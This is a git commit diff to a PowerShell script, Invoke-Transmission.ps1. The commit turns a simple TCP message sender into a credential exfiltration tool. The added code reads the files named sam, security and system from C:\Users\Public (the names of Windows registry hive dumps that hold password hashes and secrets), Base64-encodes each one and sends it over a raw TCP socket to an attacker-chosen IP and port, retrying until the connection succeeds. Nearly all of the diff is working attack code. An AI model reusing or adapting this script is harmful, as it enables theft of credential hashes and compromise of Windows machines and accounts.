748023f06c2ebb84ab3fd2ce87fceff96bede3af
mo-tec <moritzpfefferkorn@hotmail.com>
2020-10-13 01:24:19 +0200

    Update Invoke-Transmission.ps1

--- Invoke-Transmission.ps1
+++ Invoke-Transmission.ps1
@@ -1,26 +1,47 @@
 function Invoke-Transmission {
     Param (
-        [Parameter(Position = 0, Mandatory=$true, ValueFromPipeline)]
-        [string]
-        $Message,
-
-        [Parameter(Position = 1, Mandatory = $true)]
+        [Parameter(Position = 0, Mandatory = $true)]
         [ValidateNotNullOrEmpty()]
         [string]
         $ip,
 
-        [Parameter(Position = 2)]
+        [Parameter(Position = 1)]
         [ValidateNotNullOrEmpty()]
         [int]
         $port = 9000
     )
+    $Message1 = [System.Convert]::ToBase64String([System.IO.File]::ReadAllBytes('C:\Users\Public\sam'))
+    $Message2 = [System.Convert]::ToBase64String([System.IO.File]::ReadAllBytes('C:\Users\Public\security'))
+    $Message3 = [System.Convert]::ToBase64String([System.IO.File]::ReadAllBytes('C:\Users\Public\system'))
+    echo First
     do{
         try   { $client = New-Object System.Net.Sockets.TcpClient $ip, $port } 
         catch { Sleep 1 }
     } while (-not $client.Connected)
     $stream = $client.GetStream()
-    $data = [text.Encoding]::Ascii.GetBytes($Message)
+    $data = [text.Encoding]::Ascii.GetBytes($Message1)
     $stream.Write($data,0,$data.length)
+    $client.Close()
+    $client.Dispose()
+    echo Second
+    do{
+        try   { $client = New-Object System.Net.Sockets.TcpClient $ip, $port } 
+        catch { Sleep 1 }
+    } while (-not $client.Connected)
+    $stream = $client.GetStream()
+    $data = [text.Encoding]::Ascii.GetBytes($Message2)
+    $stream.Write($data,0,$data.length)
+    $client.Close()
+    $client.Dispose()
+    echo Third
+    do{
+        try   { $client = New-Object System.Net.Sockets.TcpClient $ip, $port } 
+        catch { Sleep 1 }
+    } while (-not $client.Connected)
+    $stream = $client.GetStream()
+    $data = [text.Encoding]::Ascii.GetBytes($Message3)
+    $stream.Write($data,0,$data.length)
+    echo Finished
     $client.Close()
     $client.Dispose()
 }
